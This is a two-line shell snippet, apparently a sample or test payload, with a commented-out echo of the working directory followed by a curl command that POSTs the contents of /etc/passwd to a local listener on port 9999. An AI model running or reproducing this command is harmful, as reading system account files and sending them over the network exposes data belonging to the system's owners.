# /bin/echo "current directory $(/bin/pwd)"
curl -X POST -d"$(cat /etc/passwd)" localhost:9999